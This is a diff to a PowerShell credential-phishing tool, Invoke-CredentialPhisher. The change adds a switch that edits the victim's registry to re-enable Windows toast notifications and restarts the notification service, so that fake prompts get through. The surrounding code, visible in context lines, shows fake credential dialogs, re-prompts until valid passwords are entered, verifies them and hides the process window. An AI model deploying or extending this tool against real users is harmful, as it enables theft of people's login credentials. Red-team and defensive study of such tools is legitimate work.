@@ -72,6 +72,11 @@ function Invoke-CredentialPhisher {
 
         Verify the creds a user provides, and prompt them again until they either click cancel or enter valid creds
 
+        
+    .PARAMETER EnableToastNotificationsIfDisabled
+
+        Will set registry item to enable toast notifcations and restarts corresponding service on the targets computer
+
     .PARAMETER HideProcess
 
         Hide the window of the process we claim launched the prompt
@@ -120,10 +125,21 @@ function Invoke-CredentialPhisher {
         $VerifyCreds = $false,
 
         [switch]
+        $EnableToastNotificationsIfDisabled = $false,
+
+        [switch]
         $HideProcesses = $false
     )
 
     #region functions
+
+    function Set-WindowsToastSetting {
+
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "ToastEnabled" -Type Dword -Value 1
+        Restart-Service -Name "WpnUserService*"        
+    }
+
+
     function Set-WindowVisibility ([int32[]]$hWnds, [Phishwin.WindowStates]$windowState) {    
         # thx: https://www.go4expert.com/articles/hiding-windows-c-sharp-t973/
         foreach ($hWnd in $hWnds) {
@@ -383,9 +399,14 @@ function Invoke-CredentialPhisher {
         }
     }
 
-    function Invoke-Prompt ([string]$ToastTitle, [string]$ToastMessage, [string]$Application, [string]$CredBoxTitle, [string]$CredBoxMessage, [string]$ToastType, [bool]$VerifyCreds, [bool]$HideProcesses) {
+    function Invoke-Prompt ([string]$ToastTitle, [string]$ToastMessage, [string]$Application, [string]$CredBoxTitle, [string]$CredBoxMessage, [string]$ToastType, [bool]$VerifyCreds, [bool]$EnableToastNotificationsIfDisabled, [bool]$HideProcesses) {
         $global:credential = $null
         $global:VerifyCreds = $VerifyCreds
+
+        # Check if we need to set a registry key to enable toast notifications
+        if ($EnableToastNotificationsIfDisabled) {
+            Set-WindowsToastSetting 
+        }
 
         # Load Depedencies
         Import-PhishWinLib
@@ -614,5 +635,7 @@ function Invoke-CredentialPhisher {
         $outData | Out-String 
     }
 
-    Invoke-Prompt $ToastTitle $ToastMessage $Application $CredBoxTitle $CredBoxMessage $ToastType $VerifyCreds $HideProcesses
+    #endregion
+
+    Invoke-Prompt -ToastTitle $ToastTitle -ToastMessage $ToastMessage -Application $Application -CredBoxTitle $CredBoxTitle -CredBoxMessage $CredBoxMessage -ToastType $ToastType -VerifyCreds $VerifyCreds -EnableToastNotificationsIfDisabled $EnableToastNotificationsIfDisabled -HideProcesses  $HideProcesses
 }
